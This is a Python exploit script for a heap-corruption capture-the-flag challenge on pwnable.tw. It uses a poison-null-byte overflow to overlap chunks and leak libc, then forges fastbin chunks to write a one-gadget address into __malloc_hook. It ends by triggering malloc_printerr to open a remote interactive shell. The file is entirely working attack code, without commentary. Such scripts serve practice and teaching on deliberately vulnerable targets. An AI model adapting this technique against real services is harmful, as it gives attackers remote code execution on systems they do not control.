import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a):
    return struct.pack("<Q",a)

def u(a):
    return struct.unpack("<Q",a)[0]

def add(size,name,secret):
    read_until(f,"Your choice :")
    f.write("1\n")
    read_until(f,"Size of heart :")
    f.write(str(size)+"\n")
    read_until(f,"Name of heart :")
    f.write(name+"\n")
    read_until(f,"secret of my heart :")
    f.write(secret+"\n")

def delete(index):
    read_until(f,"Your choice :")
    f.write("3\n")
    read_until(f,"Index :")
    f.write(str(index)+"\n")

def show(index):
    read_until(f,"Your choice :")
    f.write("2\n")
    read_until(f,"Index :")
    f.write(str(index)+"\n")

def main():
    add(136,"aaaa","A"*128)
    add(256,"bbbb","B"*256)
    add(136,"cccc","C"*128)
    delete(0)
    delete(1)
    add(136,"aaaa","A"*128+p(0x90)) # poison null byte
    add(128,"dddd","D"*128)
    add(16,"eeee","E"*16)
    add(16,"ffff","F"*16)
    #add(16,"gggg","G"*16)
    delete(1)
    delete(2)
    add(128,"hhhh","H"*128)
    add(128,"iiii","I"*128)
    add(128,"jjjj","J"*128)
    delete(2)
    show(3)
    # leak libc
    read_until(f,"Secret : ")
    top_addr = u(f.read(6)+"\x00"*2) 
    print "top_addr: ",hex(top_addr)
    libc_base = top_addr - top_offset
    print "libc base: ",hex(libc_base)
    malloc_hook = libc_base + malloc_hook_offset
    print "malloc_hook: ",hex(malloc_hook)
    one_rce = libc_base + one_rce_offset
    print "one_rce: ",hex(one_rce)
    target = top_addr - 0x8b 
    print "target_addr: ",hex(target)

    # create fake chunks and free fake chunks to write one_rce in __malloc_hook
    delete(1)
    delete(5)
    add(256,"hhhh","H"*128+p(0)+p(0x71)+"F"*16+p(0)+p(0x71)+"G"*16+p(0)*7+p(0x91))
    add(128,"iiii",p(0)+p(0x91)+"\n")
    delete(3)
    delete(4)
    delete(1)
    add(256,"hhhh","H"*128+p(0)+p(0x71)+"F"*16+p(0)+p(0x71)+p(target)+"G"*8+"\n")
    add(96,"iiii","H"*8+"\n")
    add(96,"jjjj","A"*19+p(one_rce)+"\n")

    # trigger malloc_printerr
    read_until(f,"Your choice :")
    f.write("3\n")
    read_until(f,"Index :")
    f.write("4\n")

    shell(s)

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("chall.pwnable.tw", 10302)
        one_rce_offset = 0x45278
        one_rce_offset = 0xef6c4
        #one_rce_offset = 0xf0567
        malloc_hook_offset = 0x00000000003c3b10
        top_offset = 0x3c3b78
        main()
    else:
        s, f = sock("localhost", 10302)
        one_rce_offset = 0x4526a
        one_rce_offset = 0xf02a4
        #one_rce_offset = 0xf1147
        malloc_hook_offset = 0x00000000003c4b10
        top_offset = 0x3c4b78
        main()
